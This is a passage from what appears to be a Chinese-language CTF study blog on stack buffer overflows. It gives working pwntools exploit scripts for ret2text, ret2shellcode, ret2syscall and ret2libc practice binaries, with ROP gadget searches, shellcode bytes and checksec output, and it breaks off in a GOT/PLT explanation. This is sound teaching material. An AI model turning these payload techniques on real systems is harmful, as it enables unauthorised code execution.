pwntools<br></code></pre></td></tr></table></figure><p>ROPgadget</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/JonathanSalwan/</span>ROPgadget.git<br><br>cd ROPgadget<br><br>sudo python setup.py install<br><br><span class="hljs-comment"># 遇到报错</span><br>pkg_resources.ResolutionError: Script <span class="hljs-string">&#x27;scripts/ROPgadget&#x27;</span> not found <span class="hljs-keyword">in</span> metadata at <span class="hljs-string">&#x27;/home/philo/.local/lib/python3.8/site-packages/ROPGadget-7.3.dist-info&#x27;</span><br><br>$ sudo cp -r <span class="hljs-regexp">/home/</span>philo<span class="hljs-regexp">/.local/</span>lib<span class="hljs-regexp">/python3.8/</span>site-packages/ROPGadget-<span class="hljs-number">7.3</span>.dist-info<br></code></pre></td></tr></table></figure><p>LibcSearcher</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/lieanu/LibcSearcher.git<br><br>cd LibcSearcher<br><br>python setup.py develop # 如果权限不够加个sudo<br></code></pre></td></tr></table></figure><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><ul><li>如果有<code>system(/bin/sh) </code>代码可以直接覆盖返回地址跳转，从而得到shell</li><li>使用<code>asm(shellcraft.sh())</code>自行构造shellcode，将返回地址修改为可以执行的bss段的代码</li><li>使用ROPgadget命令去找到gadget进行组合，利用pop+ret的机制对寄存器进行赋值，从而触发<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></li></ul><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text指控制程序执行程序本身已有的的代码 (.text)</p><p>checksec一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2text</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     No       0               2       ret2text<br></code></pre></td></tr></table></figure><p>f5，发现由于main函数中调用了gets函数，因此存在缓冲区溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用alt+t查找字符串，发现有<code>system(/bin/sh)</code>，因此可以使用ret2text的方式获得shell，将返回地址直接修改为0804863A即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048763</span> command         db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span>          ; DATA XREF: secure+<span class="hljs-number">3</span>D↑o<br>    <br>.text:<span class="hljs-number">0804863</span>A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">08048641</span>                 call    _system<br></code></pre></td></tr></table></figure><blockquote><p>不小心关闭了窗口，想恢复可以点击Window-》reset desktop</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230320215831749.png"></p><p>gets函数被调用时写入字符串aaaaa，观察可以发现缓冲区的起始地址，为<code>$esp+0x1c</code>，也即是0xffffd2ec</p><blockquote><p>下断点的几种方式：</p><ul><li>b *main+4</li><li>b *0xffff1234</li><li>b func_name</li></ul></blockquote><p><code>$ebp-$esp-0x1c+4</code>就是缓冲区起始地址相对于返回地址的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>File <span class="hljs-string">&quot;payload.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">6</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0</span>x6c+<span class="hljs-number">4</span>) + p32(target))<br>TypeError: can <span class="hljs-keyword">only</span> concatenate str (not <span class="hljs-string">&quot;bytes&quot;</span>) <span class="hljs-keyword">to</span> str<br><br>需要使用<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;A&#x27;</span>而不是<span class="hljs-string">&#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303202347078.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2shellcode</span><br>ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2shellcode</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79 Symbols     No       0               3       ret2shellcode<br></code></pre></td></tr></table></figure><p>与上一题不同，此次没有<code>system(/bin/sh)</code>可以直接跳转，需要我们自己构造shellcode</p><ul><li>我们输入的字符串会被复制到buf2（在bss段），可以使用vmmap命令查看这段地址是不是可执行的，如果可以执行，那么就将返回地址覆盖为buf2的地址</li><li>使用gdb查看gets函数被调用时的栈帧情况，发现缓冲区在<code>esp+0x1c</code>的地方</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">lea     eax, [esp+0x1c]<br>mov     [esp], eax      ; s<br>call    _gets<br></code></pre></td></tr></table></figure><p>注意line9</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh()) <span class="hljs-comment">#生成shellcode</span><br>buf2_addr = <span class="hljs-number">0x804a080</span> <span class="hljs-comment">#将返回地址覆盖为buf2的地址</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&#x27;A&#x27;</span>) + p32(buf2_addr)) <span class="hljs-comment">#将shellcode不足112的部分用A填充，并且左对齐</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>看一下填充的字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span>&#x27;jhh///sh/bin\x<span class="hljs-number">89</span>\xe<span class="hljs-number">3</span>h\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">814</span>$ri\x<span class="hljs-number">01</span>\x<span class="hljs-number">011</span>\xc<span class="hljs-number">9</span>Qj\x<span class="hljs-number">04</span>Y\x<span class="hljs-number">01</span>\xe<span class="hljs-number">1</span>Q\x<span class="hljs-number">89</span>\xe<span class="hljs-number">11</span>\xd<span class="hljs-number">2</span>j\x<span class="hljs-number">0</span>bX\xcd\x<span class="hljs-number">80</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x<span class="hljs-number">80</span>\xa<span class="hljs-number">0</span>\x<span class="hljs-number">04</span>\x<span class="hljs-number">08</span>&#x27;<br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>需要触发execve系统调用来获取 shell，也即是执行代码：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><p>对于32位程序，传参从左往右依次是： EBX、ECX、EDX、ESI、EDI、EBP，EAX寄存器存放系统调用号</p><p>对于64位程序，传参从左往右依次是： RDI、RSI、RDX、R10、R8、R9 ，，RAX寄存器存放系统调用号</p><p>在规划好寄存器之后，需要执行<code>int 0x80</code>命令去触发系统调用</p><p>因此，为了执行上面代码，我们需要让寄存器满足：</p><ul><li>eax 保存 0xb （execve函数的系统调用号）</li><li>ebx 保存字符串“/bin/sh”的地址（const char *filename）</li><li>ecx 为0（char *const argv[]）</li><li>edx为0（char *const envp[]）</li></ul><p>因此我们需要构造rop gadgets</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211937744.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211948901.png"></p><ul><li>EBP  0xffffd328</li><li>ESP  0xffffd2a0</li><li>缓冲区在esp上面0x1c的位置</li><li><code>$EBP-$ESP-0x1c+4</code>是偏移</li></ul><p>寻找一些gadges：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;ebx&#x27;</span><br><br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret #pop_edx_ecx_ebx_ret<br><br>~&gt; ROPgadget --binary rop  --string <span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span><br><span class="hljs-section">Strings information</span><br><span class="hljs-section">============================================================</span><br>0x080be408 : /bin/sh<br><br><span class="hljs-code"> ~&gt; ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="hljs-section">Gadgets information</span><br><span class="hljs-section">============================================================</span><br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br><br>~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;eax&#x27;</span><br><br>0x080bb196 : pop eax ; ret<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~$</span><span class="bash"> checksec --file=ret2libc1</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               1       ret2libc1<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> file ret2libc1</span><br>ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped<br></code></pre></td></tr></table></figure><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于gets函数的存在，存在缓冲区溢出漏洞</p><p>找一下sh字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> ROPgadget --binary ret2libc1 --string <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Strings information<br>============================================================<br>0x08048720 : /bin/sh<br></code></pre></td></tr></table></figure><p>可以找到system函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">.plt:08048460 ; int system(const char *command)<br>.plt:08048460 _system         proc near<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python<br>from pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>由于ret（也即是pop eip）的存在，system函数上面+8地址处才是真正的system函数的参数，因此+4地址处需要4字节的填充</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222128090.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2libc2</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               2       ret2libc2<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2libc2</span><br>ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有system函数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_system</span>.plt<span class="hljs-number">08048490</span><span class="hljs-number">00000006</span><span class="hljs-number">00000000</span><span class="hljs-number">00000004</span>R.....T.<br></code></pre></td></tr></table></figure><p>但是这道题没有现成的/bin/sh字符串，因此我们需要把/bin/sh写到.bss段里面。看一下.bss段</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.bss:0804A080 ; char buf2[100]</span><br><span class="hljs-title">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="hljs-title">.bss:0804A080 _bss            ends</span><br><span class="hljs-title">.bss:0804A080</span><br></code></pre></td></tr></table></figure><p>我们可以把返回地址写成gets函数，手动输入/bin/sh字符串，达到将/bin/sh写入到.bss段的目的，之后触发system(/bin/sh)即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br><span class="hljs-comment">#ida得到地址</span><br>gets_plt=<span class="hljs-number">0x08048460</span><br>binsh_addr = <span class="hljs-number">0x0804A080</span><br>system_plt = <span class="hljs-number">0x08048490</span><br><br><span class="hljs-comment">#gdb调一下得到112偏移</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt,system_plt,binsh_addr,binsh_addr])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222348210.png"></p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./ret2libc3</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/ret2libc3&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><h2 id="got、plt、链接"><a href="#got、plt、链接" class="headerlink" title="got、plt、链接"></a>got、plt、链接</h2><p>这里需要补充关于链接的知识</p><p>动态链接的程序，不会再在编译时得到printf的地址。原因很简单，libc有可能升级或者改变版本版本（比如换了别的主机运行不同的libc版本），因此不能硬编码库函数地址；此外，由于 ASLR 的现代系统在每次程序调用的不同位置加载库，硬编码也是不可以的，我们可以使用ldd命令查看动态链接的程序的libc的地址，ldd 命令模拟加载可执行程序需要的动态链接库，但并不执行程序，后面的地址部分表示模拟装载过程中动态链接库的地址。如果尝试多次运行 ldd 命令，我们会发现每次动态链接库的地址都是不一样的，因为这个地址是动态定位的</p><p>Linux的策略是，允许在程序运行时查找所有这些地址，并提供一种从库调用这些函数的机制，这就是所谓的重定位，这个过程由链接器完成</p><p>下面是链接期间有关的段，在ida中可以使用shift+f7查找段的地址</p><table><thead><tr><th>段</th><th>说明</th></tr></thead><tbody><tr><td><strong>.plt</strong>（<code>Procedure Linkage Table</code>)</td><td>过程链接表</td></tr><tr><td><strong>.got</strong>（<code>Global Offset Table</code>）</td><td>全局偏移表，链接器为外部符号填充的实际偏移表</td></tr><tr><td><strong>.got.plt</strong></td><td>属于got表</td></tr><tr><td><strong>.plt.got</strong></td><td>只是为了对称，无意义</td></tr></tbody></table><p>routine：</p><ul><li>1.调用libc函数，比如gets函数，<code>call _puts</code></li><li>2.进入plt表，jmp到got表，由于懒加载机制，第一次不会得到真实地址，而是进入到got表之后重新回到plt表，如果不是第一次那么会直接跳转到已经解析的地址处</li><li>3.push func_id、jmp common进入公共plt，再次进入got表</li><li>4.跳转到_dl_runtime_resolve函数，进行地址解析、重定位</li><li>5.将真实地址写入got表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048672</span>                 call    _puts<br><br><span class="hljs-meta"># puts@plt </span><br>    <br>.plt:<span 